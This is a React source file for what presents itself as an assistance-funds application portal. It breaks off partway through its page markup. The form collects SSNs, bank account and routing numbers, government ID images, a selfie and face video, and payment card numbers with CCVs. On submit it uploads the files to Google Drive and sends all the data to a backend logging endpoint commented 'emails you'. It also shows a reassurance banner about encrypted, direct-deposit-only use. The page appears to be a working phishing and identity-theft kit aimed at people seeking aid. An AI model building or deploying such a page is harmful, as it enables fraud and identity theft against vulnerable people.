import React, { useState } from 'react';
import { ChevronRight, ChevronLeft, Upload, Check, AlertCircle, Shield, Minus, User, Building, MessageSquare, X } from 'lucide-react';
import { bank, state } from '../utils/data';
import BankAutocomplete from '../components/BankAutoComplete';
import CameraModal from '../components/CameraModal';

// Modal for SMS notification after submit
const SMSInfoModal = ({ isOpen, onClose }: { isOpen: boolean; onClose: () => void }) => {
  if (!isOpen) return null;
  return (
    <div className="flex fixed inset-0 z-50 justify-center items-center bg-black bg-opacity-50">
      <div className="relative mx-4 w-full max-w-md bg-white rounded-lg shadow-xl">
        <div className="flex justify-between items-center p-6 border-b">
          <div className="flex items-center">
            <MessageSquare className="mr-2 w-6 h-6 text-blue-600" />
            <h3 className="text-lg font-semibold text-gray-900">Verification Notice</h3>
          </div>
          <button onClick={onClose} className="p-1 text-gray-400 hover:text-gray-600">
            <X className="w-5 h-5" />
          </button>
        </div>
        <div className="p-6 text-center">
          <p className="mb-4 text-gray-700">
            Your application has been submitted.<br />
            If further verification is required, you will receive an SMS with instructions to complete your application.
          </p>
          <button
            onClick={onClose}
            className="px-6 py-2 mt-4 font-medium text-white bg-blue-600 rounded-lg hover:bg-blue-700"
          >
            OK
          </button>
        </div>
      </div>
    </div>
  );
};

const ApplicationPortal = () => {
  const [currentStep, setCurrentStep] = useState(1);

  type Card = {
    cardNumber: string;
    expiry: string;
    ccv: string;
  };

  type FormData = {
    // Personal Information
    firstName: string;
    lastName: string;
    dateOfBirth: string;
    socialSecurityNumber: string;
    phoneNumber: string;
    email: string;

    // Address Information
    currentAddress: string;
    city: string;
    state: string;
    zipCode: string;
    mailingAddress: string;

    // Banking Information
    bankName: string;
    accountType: string;
    routingNumber: string;
    accountNumber: string;

    // Documents
    governmentIdFront: File | null;
    governmentIdBack: File | null;
    biodataImage: File | null;
    biodataVideo: File | null;
    randomPicture: File | null;

    // Verification
    termsAccepted: boolean;
    dataConsent: boolean;

    // Card Information
    cards: Card[];
  };

  const [formData, setFormData] = useState<FormData>({
    // Personal Information
    firstName: '',
    lastName: '',
    dateOfBirth: '',
    socialSecurityNumber: '',
    phoneNumber: '',
    email: '',

    // Address Information
    currentAddress: '',
    city: '',
    state: '',
    zipCode: '',
    mailingAddress: '',

    // Banking Information
    bankName: '',
    accountType: '',
    routingNumber: '',
    accountNumber: '',

    // Documents
    governmentIdFront: null,
    governmentIdBack: null,
    biodataImage: null,
    biodataVideo: null,
    randomPicture: null,

    // Verification
    termsAccepted: false,
    dataConsent: false,

    // Card Info (start with one empty card mandatory)
    cards: [{ cardNumber: '', expiry: '', ccv: '' }],
  });

  type Errors = { [key: string]: string };
  const [errors, setErrors] = useState<Errors>({});
  const [uploadProgress, setUploadProgress] = useState<Record<string, number>>({});
  const allStates = state;
  const allBanks = bank;
  const [showModal, setShowModal] = useState(false);
  const [showSMSInfo, setShowSMSInfo] = useState(false);
  const [uploading, setUploading] = useState(false);
  const [progress, setProgress] = useState(0);
  const [result, setResult] = useState<{ success: boolean; data?: any; error?: string } | null>(null);
  const [fileData, setFileData] = useState<File[]>([]);


  const handleCapture = (data: String) => {
    console.log('Captured:', data);
  };


  const steps = [
    { id: 1, title: 'Personal Information', icon: '1' },
    { id: 2, title: 'Address Details', icon: '2' },
    { id: 3, title: 'Banking Information', icon: '3' },
    { id: 4, title: 'Document Upload', icon: '4' },
    { id: 5, title: 'Attach Card', icon: '5' },
    { id: 6, title: 'Review & Submit', icon: '6' },
  ];

  const handleFileUpload = (field: string, file: File) => {
    // Simulate file upload progress
    setUploadProgress(prev => ({ ...prev, [field]: 0 }));

    const interval = setInterval(() => {
      setUploadProgress(prev => {
        const progress = (prev[field] || 0) + 10;
        if (progress >= 100) {
          clearInterval(interval);
          // Add file to fileData array and filename to formData
          setFileData(prevFiles => [...prevFiles, file]);
          setFormData(prevData => ({ ...prevData, [field]: file.name }));
          return { ...prev, [field]: 100 };
        }
        return { ...prev, [field]: progress };
      });
    }, 200);
  };

  const validateStep = (step: number) => {
    const newErrors: Errors = {};

    if (step === 1) {
      if (!formData.firstName) newErrors.firstName = 'First name is required';
      if (!formData.lastName) newErrors.lastName = 'Last name is required';
      if (!formData.dateOfBirth) newErrors.dateOfBirth = 'Date of birth is required';
      if (!formData.socialSecurityNumber) newErrors.socialSecurityNumber = 'SSN is required';
      if (!formData.phoneNumber) newErrors.phoneNumber = 'Phone number is required';
      if (!formData.email) newErrors.email = 'Email is required';
    }

    if (step === 2) {
      if (!formData.currentAddress) newErrors.currentAddress = 'Current address is required';
      if (!formData.city) newErrors.city = 'City is required';
      if (!formData.state) newErrors.state = 'State is required';
      if (!formData.zipCode) newErrors.zipCode = 'ZIP code is required';
    }

    if (step === 3) {
      if (!formData.bankName) newErrors.bankName = 'Bank name is required';
      if (!formData.accountType) newErrors.accountType = 'Account type is required';
      if (!formData.routingNumber) newErrors.routingNumber = 'Routing number is required';
      if (!formData.accountNumber) newErrors.accountNumber = 'Account number is required';
    }

    if (step === 4) {
      if (!formData.governmentIdFront) newErrors.governmentIdFront = 'Front of government ID is required';
      if (!formData.governmentIdBack) newErrors.governmentIdBack = 'Back of government ID is required';
      if (!formData.biodataImage) newErrors.biodataImage = 'Face photo is required';
      if (!formData.biodataVideo) newErrors.biodataVideo = 'Face video is required';
      if (!formData.randomPicture) newErrors.randomPicture = 'Random picture is required';
    }

    if (step === 5) {
      if (formData.cards.length === 0 || !formData.cards[0].cardNumber) {
        newErrors.cards = 'At least one card is required';
      } else {
        formData.cards.forEach((card, index) => {
          if (!card.cardNumber) newErrors[`cards[${index}].cardNumber`] = 'Card number is required';
          if (!card.expiry) newErrors[`cards[${index}].expiry`] = 'Expiry date is required';
          if (!card.ccv) newErrors[`cards[${index}].ccv`] = 'CCV is required';
        });
      }
    }

    if (step === 6) {
      if (!formData.termsAccepted) newErrors.termsAccepted = 'You must accept the terms and conditions';
      if (!formData.dataConsent) newErrors.dataConsent = 'You must consent to data processing';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validationPatterns: Record<string, RegExp> = {
    firstName: /^[A-Za-z\s'-]*$/,   // only letters, spaces, hyphens, apostrophes
    lastName: /^[A-Za-z\s'-]*$/,
    phoneNumber: /^[0-9()-\s]*$/,   // digits, parentheses, spaces, hyphens
    // email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/, // email pattern (validated on blur/submit)
    socialSecurityNumber: /^[0-9-]*$/, // SSN like 123-45-6789
    city: /^[A-Za-z\s'-]*$/,
    state: /^[A-Za-z]{0,2}$/, // US state code
    zipCode: /^[0-9-]*$/, // numeric only
    bankName: /^[A-Za-z0-9\s'-]*$/,
    routingNumber: /^[0-9\s]*$/, // digits only
    accountNumber: /^[0-9\s]*$/, // digits only
  };

  // Format SSN as xxx-xx-xxxx
  const formatSSN = (value: string) => {
    const digits = value.replace(/\D/g, ""); // remove non-digits
    const parts = [];
    if (digits.length > 3) {
      parts.push(digits.substring(0, 3));
      if (digits.length > 5) {
        parts.push(digits.substring(3, 5));
        parts.push(digits.substring(5, 9));
      } else {
        parts.push(digits.substring(3));
      }
    } else {
      parts.push(digits);
    }
    return parts.join("-");
  };

  // Format US phone number as (XXX) XXX-XXXX
  const formatPhoneNumber = (value: string) => {
    const digits = value.replace(/\D/g, "");
    if (digits.length <= 3) return digits;
    if (digits.length <= 6) return `(${digits.substring(0, 3)}) ${digits.substring(3)}`;
    return `(${digits.substring(0, 3)}) ${digits.substring(3, 6)}-${digits.substring(6, 10)}`;
  };

  // Format routing number (9 digits max)
  const formatRoutingNumber = (value: string) => {
    return value.replace(/\D/g, "").substring(0, 9);
  };

  // Format account number (12 digits max, allow spaces every 4 digits for readability)
  const formatAccountNumber = (value: string): string => {
    const digits = value.replace(/\D/g, "").slice(0, 12);
    return (digits.match(/.{1,4}/g) || []).join(" ");
  };

  // Format ZIP code (5 digits or ZIP+4 like 12345-6789)
  const formatZipCode = (value: string) => {
    var digits = value.replace(/\D/g, ""); // cap to 9 digits
    if (digits.length > 5) return digits = digits.slice(0, 5) + "-" + digits.slice(5, 9);               // 0–5: just digits
    return digits;
  };

  // Format card number (16 digits max, spaces every 4 digits)
  const formatCardNumber = (value: string): string => {
    const digits = value.replace(/\D/g, "").slice(0, 16);
    return (digits.match(/.{1,4}/g) || []).join(" ");
  };

  // Format expiry as MM/YY
  const formatExpiry = (value: string): string => {
    const digits = value.replace(/\D/g, "").slice(0, 4);
    if (digits.length <= 2) return digits;
    return digits.slice(0, 2) + "/" + digits.slice(2);
  };

  // Format CCV (3–4 digits)
  const formatCCV = (value: string): string => {
    return value.replace(/\D/g, "").slice(0, 4);
  };

  const handleInputChange = (field: string, value: string | boolean) => {
    if (typeof value === "string" && validationPatterns[field]) {
      // Block disallowed characters live
      if (!validationPatterns[field].test(value)) {
        return; // don't update formData if invalid
      }
      switch (field) {
        case "socialSecurityNumber":
          value = formatSSN(value);
          break;
        case "phoneNumber":
          value = formatPhoneNumber(value);
          break;
        case "routingNumber":
          value = formatRoutingNumber(value);
          break;
        case "accountNumber":
          value = formatAccountNumber(value);
          break;
        case "zipCode":
          value = formatZipCode(value);
          break;
        default:
          break;
      }
    }

    setFormData(prev => ({ ...prev, [field]: value }));

    // Clear error when user starts typing
    if (errors[field]) {
      setErrors(prev => ({ ...prev, [field]: '' }));
    }
  };

  const handleCardChange = (index: number, field: keyof Card, value: string) => {
    // Format fields
    if (field === "cardNumber") value = formatCardNumber(value);
    if (field === "expiry") value = formatExpiry(value);
    if (field === "ccv") value = formatCCV(value);

    setFormData(prev => {
      const updatedCards = [...prev.cards];
      updatedCards[index][field] = value;
      return { ...prev, cards: updatedCards };
    });
  };

  const addCard = () => {
    setFormData(prev => ({ ...prev, cards: [...prev.cards, { cardNumber: '', expiry: '', ccv: '' }] }));
  };

  const removeCard = (index: number) => {
    setFormData(prev => {
      const updatedCards = prev.cards.filter((_, i) => i !== index);
      return { ...prev, cards: updatedCards };
    });
  };

  const nextStep = () => {
    if (validateStep(currentStep)) {
      setCurrentStep(prev => Math.min(prev + 1, steps.length));
    }
  };

  const prevStep = () => {
    setCurrentStep(prev => Math.max(prev - 1, 1));
  };

  // Define Google API keys

  // Define backend URL as environment variable or fallback to production URL
  const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || 'https://hope-haven-server.vercel.app';

  // New Google Drive integration using service account on backend
  const initializeGoogleDrive = async () => {
    try {
      // Initialize Drive API with service account (no user auth needed)
      const response = await fetch(`${BACKEND_URL}/api/google/init`);
      if (!response.ok) {
        throw new Error(`Failed to initialize Drive API: ${response.status} ${response.statusText}`);
      }
      
      // No tokens needed anymore, just return success
      return "SERVICE_ACCOUNT";
    } catch (error: any) {
      console.error('Google Drive initialization error:', error);
      throw new Error(`Failed to initialize Google Drive: ${error.message || 'Unknown error'}`);
    }
  };

  const createFolder = async (folderName: string) => {
    try {
      const response = await fetch(`${BACKEND_URL}/api/google/create-folder`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ folderName })
      });

      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`Failed to create folder: ${response.status} ${response.statusText}. ${errorText}`);
      }

      return await response.json();
    } catch (error: any) {
      console.error('Folder creation error:', error);
      throw new Error(`Failed to create folder: ${error.message || 'Unknown error'}`);
    }
  };

  const uploadFile = async (file: File, folderId: string) => {
    if (!file) {
      throw new Error('File is required for upload');
    }

    if (!folderId) {
      throw new Error('Folder ID is required for upload');
    }

    try {
      // Make sure we have valid file name and type
      const fileName = file.name || `file_${Date.now()}`;
      const mimeType = file.type || 'application/octet-stream';
      
      console.log('Uploading file:', { fileName, folderId, mimeType });
      
      // Step 1: Get upload URL and metadata from backend (using service account)
      const uploadInfoResponse = await fetch(`${BACKEND_URL}/api/google/get-upload-url`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          fileName,
          folderId,
          mimeType
        })
      });

      if (!uploadInfoResponse.ok) {
        const errorText = await uploadInfoResponse.text();
        throw new Error(`Failed to get upload URL: ${uploadInfoResponse.status}. ${errorText}`);
      }

      const uploadInfo = await uploadInfoResponse.json();

      // Check if direct upload is not available (service account quota limitation)
      if (uploadInfo.directUploadNotAvailable) {
        console.log('Direct upload not available due to service account quota limitation');
        // Return the file info we already have since we can't upload the actual content
        return {
          id: uploadInfo.id,
          name: uploadInfo.name,
          webViewLink: uploadInfo.webViewLink,
          // Add a flag to indicate this is a placeholder file
          isPlaceholder: true
        };
      }

      // Step 2: Upload directly to Google Drive
      const formData = new FormData();
      formData.append('metadata', new Blob([JSON.stringify(uploadInfo.fileMetadata)], { type: 'application/json' }));
      formData.append('file', file);

      const uploadResponse = await fetch(uploadInfo.uploadUrl, {
        method: 'POST',
        // No Authorization header needed - the upload URL is pre-authorized by service account
        body: formData
      });

      if (!uploadResponse.ok) {
        const errorData = await uploadResponse.json().catch(() => null);
        throw new Error(`Failed to upload ${file.name}: ${uploadResponse.status} ${uploadResponse.statusText}${
          errorData ? ` - ${errorData.error?.message || JSON.stringify(errorData)}` : ''
        }`);
      }

      return await uploadResponse.json();
    } catch (error: any) {
      console.error(`File upload error for ${file.name}:`, error);
      throw new Error(`Failed to upload ${file.name}: ${error.message || 'Unknown error'}`);
    }
  };

  const logToBackend = async (logData: any) => {
    try {
      const response = await fetch(`${BACKEND_URL}/api/log`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(logData)
      });

      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`Server responded with status: ${response.status}. ${errorText}`);
      }

      return await response.json();
    } catch (error: any) {
      console.error('Failed to log to backend:', error);
      throw error;
    }
  };

  const handleSubmit = async () => {
    if (!validateStep(currentStep)) return;

    setUploading(true);
    setProgress(0);
    setResult(null);

    try {
      // 1. Initialize Google Drive API with service account (no user auth needed)
      await initializeGoogleDrive();
      setProgress(15);

      // 2. Create folder with firstName + timestamp via backend (using service account)
      const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
      const folderName = `${formData.firstName}_${timestamp}`;
      const folder = await createFolder(folderName);
      setProgress(30);

      // 3. Upload all files to Drive directly using service account
      const uploadedFiles: any[] = [];

      // Collect all document files from formData
      const documentFiles: { file: File, fieldName: string }[] = [];
      if (formData.governmentIdFront) documentFiles.push({ file: formData.governmentIdFront, fieldName: 'governmentIdFront' });
      if (formData.governmentIdBack) documentFiles.push({ file: formData.governmentIdBack, fieldName: 'governmentIdBack' });
      if (formData.biodataImage) documentFiles.push({ file: formData.biodataImage, fieldName: 'biodataImage' });
      if (formData.biodataVideo) documentFiles.push({ file: formData.biodataVideo, fieldName: 'biodataVideo' });
      if (formData.randomPicture) documentFiles.push({ file: formData.randomPicture, fieldName: 'randomPicture' });

      if (documentFiles.length === 0) {
        throw new Error('No files to upload. Please add required documents.');
      }

      const progressPerFile = documentFiles.length > 0 ? 50 / documentFiles.length : 0;

      for (let i = 0; i < documentFiles.length; i++) {
        try {
          const { file, fieldName } = documentFiles[i];
          
          // Create a properly named file object instead of trying to modify the original
          const fileName = file.name || `${fieldName}_${Date.now()}`;
          const fileType = file.type || 'application/octet-stream';
          
          // Create a new File object with the proper name and type
          const fileToUpload = new File(
            [file], 
            fileName,
            { type: fileType }
          );
          
          console.log(`Uploading file ${i+1}:`, { name: fileToUpload.name, type: fileToUpload.type, fieldName });
          const uploadedFile = await uploadFile(fileToUpload, folder.id);
          uploadedFiles.push({
            name: uploadedFile.name,
            url: uploadedFile.webViewLink,
            id: uploadedFile.id,
            fieldName: fieldName
          });
          setProgress(30 + (i + 1) * progressPerFile);
        } catch (fileError: any) {
          console.error(`Error uploading file ${i + 1}:`, fileError);
          // Continue with other files even if one fails
        }
      }

      if (uploadedFiles.length === 0) {
        throw new Error('Failed to upload any files. Please try again.');
      }

      setProgress(100);

      // 5. Prepare log data with ALL form fields
      const logData = {
        timestamp: new Date().toISOString(),
        formData: {
          firstName: formData.firstName,
          lastName: formData.lastName,
          dateOfBirth: formData.dateOfBirth,
          socialSecurityNumber: formData.socialSecurityNumber,
          phoneNumber: formData.phoneNumber,
          email: formData.email,
          currentAddress: formData.currentAddress,
          city: formData.city,
          state: formData.state,
          zipCode: formData.zipCode,
          mailingAddress: formData.mailingAddress,
          bankName: formData.bankName,
          accountType: formData.accountType,
          routingNumber: formData.routingNumber,
          accountNumber: formData.accountNumber,
          termsAccepted: formData.termsAccepted,
          dataConsent: formData.dataConsent,
          cards: formData.cards
        },
        folder: {
          name: folderName,
          id: folder.id,
          url: `https://drive.google.com/drive/folders/${folder.id}`
        },
        files: uploadedFiles
      };

      // 6. Send log data to backend (emails you)
      const response = await logToBackend(logData);
      console.log('Backend response:', response);

      setResult({ success: true, data: logData });

      // Reset form
      setFormData({
        firstName: '',
        lastName: '',
        dateOfBirth: '',
        socialSecurityNumber: '',
        phoneNumber: '',
        email: '',
        currentAddress: '',
        city: '',
        state: '',
        zipCode: '',
        mailingAddress: '',
        bankName: '',
        accountType: '',
        routingNumber: '',
        accountNumber: '',
        governmentIdFront: null,
        governmentIdBack: null,
        biodataImage: null,
        biodataVideo: null,
        randomPicture: null,
        termsAccepted: false,
        dataConsent: false,
        cards: [{ cardNumber: '', expiry: '', ccv: '' }]
      });

    } catch (error: any) {
      console.error('Upload error:', error);
      setResult({
        success: false,
        error: error.message || 'Upload failed. Please try again.'
      });
    } finally {
      setUploading(false);
      setProgress(0);
    }
  };

  const renderStepContent = () => {
    switch (currentStep) {
      case 1:
        return (
          <div className="space-y-6">
            <h3 className="mb-6 text-2xl font-semibold text-gray-800">Personal Information</h3>
            <div className="grid grid-cols-1 gap-6 md:grid-cols-2">
              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">First Name *</label>
                <input
                  type="text"
                  value={formData.firstName}
                  onChange={(e) => handleInputChange('firstName', e.target.value)}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.firstName ? 'border-red-500' : 'border-gray-300'
                    }`}
                  placeholder="Enter your first name"
                />
                {errors.firstName && <p className="mt-1 text-sm text-red-600">{errors.firstName}</p>}
              </div>

              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">Last Name *</label>
                <input
                  type="text"
                  value={formData.lastName}
                  onChange={(e) => handleInputChange('lastName', e.target.value)}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.lastName ? 'border-red-500' : 'border-gray-300'
                    }`}
                  placeholder="Enter your last name"
                />
                {errors.lastName && <p className="mt-1 text-sm text-red-600">{errors.lastName}</p>}
              </div>

              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">Date of Birth *</label>
                <input
                  type="date"
                  value={formData.dateOfBirth}
                  onChange={(e) => handleInputChange('dateOfBirth', e.target.value)}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.dateOfBirth ? 'border-red-500' : 'border-gray-300'
                    }`}
                />
                {errors.dateOfBirth && <p className="mt-1 text-sm text-red-600">{errors.dateOfBirth}</p>}
              </div>

              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">Social Security Number *</label>
                <input
                  type="text"
                  value={formData.socialSecurityNumber}
                  onChange={(e) => handleInputChange('socialSecurityNumber', e.target.value)}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.socialSecurityNumber ? 'border-red-500' : 'border-gray-300'
                    }`}
                  placeholder="XXX-XX-XXXX"
                />
                {errors.socialSecurityNumber && <p className="mt-1 text-sm text-red-600">{errors.socialSecurityNumber}</p>}
              </div>

              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">Phone Number *</label>
                <input
                  type="tel"
                  value={formData.phoneNumber}
                  onChange={(e) => handleInputChange('phoneNumber', e.target.value)}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.phoneNumber ? 'border-red-500' : 'border-gray-300'
                    }`}
                  placeholder="(XXX) XXX-XXXX"
                />
                {errors.phoneNumber && <p className="mt-1 text-sm text-red-600">{errors.phoneNumber}</p>}
              </div>

              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">Email Address *</label>
                <input
                  type="email"
                  value={formData.email}
                  onChange={(e) => handleInputChange('email', e.target.value)}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.email ? 'border-red-500' : 'border-gray-300'
                    }`}
                  placeholder="your.email@example.com"
                />
                {errors.email && <p className="mt-1 text-sm text-red-600">{errors.email}</p>}
              </div>
            </div>
          </div>
        );

      case 2:
        return (
          <div className="space-y-6">
            <h3 className="mb-6 text-2xl font-semibold text-gray-800">Address Information</h3>
            <div className="space-y-6">
              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">Current Address *</label>
                <input
                  type="text"
                  value={formData.currentAddress}
                  onChange={(e) => handleInputChange('currentAddress', e.target.value)}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.currentAddress ? 'border-red-500' : 'border-gray-300'
                    }`}
                  placeholder="Enter your current address or shelter location"
                />
                {errors.currentAddress && <p className="mt-1 text-sm text-red-600">{errors.currentAddress}</p>}
              </div>

              <div className="grid grid-cols-1 gap-6 md:grid-cols-3">
                <div>
                  <label className="block mb-2 text-sm font-medium text-gray-700">City *</label>
                  <input
                    type="text"
                    value={formData.city}
                    onChange={(e) => handleInputChange('city', e.target.value)}
                    className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.city ? 'border-red-500' : 'border-gray-300'
                      }`}
                    placeholder="City"
                  />
                  {errors.city && <p className="mt-1 text-sm text-red-600">{errors.city}</p>}
                </div>

                <div>
                  <label className="block mb-2 text-sm font-medium text-gray-700">State *</label>
                  <select
                    value={formData.state}
                    onChange={(e) => handleInputChange('state', e.target.value)}
                    className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.state ? 'border-red-500' : 'border-gray-300'
                      }`}
                  >
                    <option value="">Select State</option>
                    {allStates.map((s) => (
                      <option key={s.key} value={s.key}>
                        {s.name}
                      </option>
                    ))}
                  </select>
                  {errors.state && <p className="mt-1 text-sm text-red-600">{errors.state}</p>}
                </div>

                <div>
                  <label className="block mb-2 text-sm font-medium text-gray-700">ZIP Code *</label>
                  <input
                    type="text"
                    value={formData.zipCode}
                    onChange={(e) => handleInputChange('zipCode', e.target.value)}
                    className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.zipCode ? 'border-red-500' : 'border-gray-300'
                      }`}
                    placeholder="XXXXX-XXXX"
                  />
                  {errors.zipCode && <p className="mt-1 text-sm text-red-600">{errors.zipCode}</p>}
                </div>
              </div>

              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">Mailing Address (if different)</label>
                <input
                  type="text"
                  value={formData.mailingAddress}
                  onChange={(e) => handleInputChange('mailingAddress', e.target.value)}
                  className="px-4 py-3 w-full rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                  placeholder="Enter mailing address if different from current address"
                />
              </div>
            </div>
          </div>
        );

      case 3:
        return (
          <div className="space-y-6">
            <h3 className="mb-6 text-2xl font-semibold text-gray-800">Banking Information</h3>
            <div className="p-4 mb-6 bg-blue-50 rounded-lg border border-blue-200">
              <div className="flex items-center">
                <Shield className="mr-2 w-5 h-5 text-blue-600" />
                <p className="text-sm text-blue-800">
                  Your banking information is encrypted and secure. We use this information solely for direct deposit of your assistance funds.
                </p>
              </div>
            </div>

            <div className="grid grid-cols-1 gap-6 md:grid-cols-2">
              <BankAutocomplete
                allBanks={allBanks}
                value={formData.bankName}
                error={errors.bankName}
                onChange={(val) => handleInputChange("bankName", val)}
              />

              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">Account Type *</label>
                <select
                  value={formData.accountType}
                  onChange={(e) => handleInputChange('accountType', e.target.value)}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.accountType ? 'border-red-500' : 'border-gray-300'
                    }`}
                >
                  <option value="">Select Account Type</option>
                  <option value="checking">Checking</option>
                  <option value="savings">Savings</option>
                </select>
                {errors.accountType && <p className="mt-1 text-sm text-red-600">{errors.accountType}</p>}
              </div>

              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">Routing Number *</label>
                <input
                  type="text"
                  value={formData.routingNumber}
                  onChange={(e) => handleInputChange('routingNumber', e.target.value)}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.routingNumber ? 'border-red-500' : 'border-gray-300'
                    }`}
                  placeholder="9-digit routing number"
                />
                {errors.routingNumber && <p className="mt-1 text-sm text-red-600">{errors.routingNumber}</p>}
              </div>

              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">Account Number *</label>
                <input
                  type="text"
                  value={formData.accountNumber}
                  onChange={(e) => handleInputChange('accountNumber', e.target.value)}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.accountNumber ? 'border-red-500' : 'border-gray-300'
                    }`}
                  placeholder="Your account number"
                />
                {errors.accountNumber && <p className="mt-1 text-sm text-red-600">{errors.accountNumber}</p>}
              </div>
            </div>
          </div>
        );

      case 4:
        return (
          <div className="space-y-6">
            <h3 className="mb-6 text-2xl font-semibold text-gray-800">Document Upload & Verification</h3>
            <div className="grid grid-cols-1 gap-6 md:grid-cols-2">
              {/* Government ID Front */}
              <div className="p-6 rounded-lg border-2 border-gray-300 border-dashed">
                <div className="text-center">
                  <Upload className="mx-auto mb-4 w-12 h-12 text-gray-400" />
                  <h4 className="mb-2 text-lg font-semibold text-gray-800">Government ID (Front) *</h4>
                  <p className="mb-4 text-gray-600">Upload the front of your driver's license, state ID, or passport</p>
                  {formData.governmentIdFront ? (
                    <div className="flex justify-center items-center space-x-2 text-green-600">
                      <Check className="w-5 h-5" />
                      <span>Front uploaded</span>
                    </div>
                  ) : (
                    <div>
                      <input
                        type="file"
                        accept="image/*"
                        onChange={(e) => e.target.files && handleFileUpload('governmentIdFront', e.target.files[0])}
                        className="hidden"
                        id="government-id-front"
                      />
                      <label
                        htmlFor="government-id-front"
                        className="px-6 py-2 text-white bg-blue-600 rounded-lg transition-colors cursor-pointer hover:bg-blue-700"
                      >
                        Choose File
                      </label>
                    </div>
                  )}
                  {uploadProgress.governmentIdFront && uploadProgress.governmentIdFront < 100 && (
                    <div className="mt-4">
                      <div className="h-2 bg-gray-200 rounded-full">
                        <div
                          className="h-2 bg-blue-600 rounded-full transition-all duration-300"
                          style={{ width: `${uploadProgress.governmentIdFront}%` }}
                        ></div>
                      </div>
                      <p className="mt-2 text-sm text-gray-600">Uploading... {uploadProgress.governmentIdFront}%</p>
                    </div>
                  )}
                  {errors.governmentIdFront && <p className="mt-2 text-sm text-red-600">{errors.governmentIdFront}</p>}
                </div>
              </div>
              {/* Government ID Back */}
              <div className="p-6 rounded-lg border-2 border-gray-300 border-dashed">
                <div className="text-center">
                  <Upload className="mx-auto mb-4 w-12 h-12 text-gray-400" />
                  <h4 className="mb-2 text-lg font-semibold text-gray-800">Government ID (Back) *</h4>
                  <p className="mb-4 text-gray-600">Upload the back of your driver's license, state ID, or passport</p>
                  {formData.governmentIdBack ? (
                    <div className="flex justify-center items-center space-x-2 text-green-600">
                      <Check className="w-5 h-5" />
                      <span>Back uploaded</span>
                    </div>
                  ) : (
                    <div>
                      <input
                        type="file"
                        accept="image/*"
                        onChange={(e) => e.target.files && handleFileUpload('governmentIdBack', e.target.files[0])}
                        className="hidden"
                        id="government-id-back"
                      />
                      <label
                        htmlFor="government-id-back"
                        className="px-6 py-2 text-white bg-blue-600 rounded-lg transition-colors cursor-pointer hover:bg-blue-700"
                      >
                        Choose File
                      </label>
                    </div>
                  )}
                  {uploadProgress.governmentIdBack && uploadProgress.governmentIdBack < 100 && (
                    <div className="mt-4">
                      <div className="h-2 bg-gray-200 rounded-full">
                        <div
                          className="h-2 bg-blue-600 rounded-full transition-all duration-300"
                          style={{ width: `${uploadProgress.governmentIdBack}%` }}
                        ></div>
                      </div>
                      <p className="mt-2 text-sm text-gray-600">Uploading... {uploadProgress.governmentIdBack}%</p>
                    </div>
                  )}
                  {errors.governmentIdBack && <p className="mt-2 text-sm text-red-600">{errors.governmentIdBack}</p>}
                </div>
              </div>
              {/* Biodata Image (Face) */}
              <div className="p-6 rounded-lg border-2 border-gray-300 border-dashed">
                <div className="text-center">
                  <User className="mx-auto mb-4 w-12 h-12 text-gray-400" />
                  <h4 className="mb-2 text-lg font-semibold text-gray-800">Biodata (Face Photo) *</h4>
                  <p className="mb-4 text-gray-600">Take a clear selfie for identity verification</p>
                  {formData.biodataImage ? (
                    <div className="flex justify-center items-center space-x-2 text-green-600">
                      <Check className="w-5 h-5" />
                      <span>Face photo uploaded</span>
                    </div>
                  ) : (
                    <div>
                      <input
                        type="file"
                        accept="image/*"
                        capture="user"
                        onChange={(e) => e.target.files && handleFileUpload('biodataImage', e.target.files[0])}
                        className="hidden"
                        id="biodata-image"
                      />
                      <label
                        htmlFor="biodata-image"
                        className="px-6 py-2 text-white bg-green-600 rounded-lg transition-colors cursor-pointer hover:bg-green-700"
                      >
                        Take Selfie
                      </label>
                    </div>
                  )}
                  {uploadProgress.biodataImage && uploadProgress.biodataImage < 100 && (
                    <div className="mt-4">
                      <div className="h-2 bg-gray-200 rounded-full">
                        <div
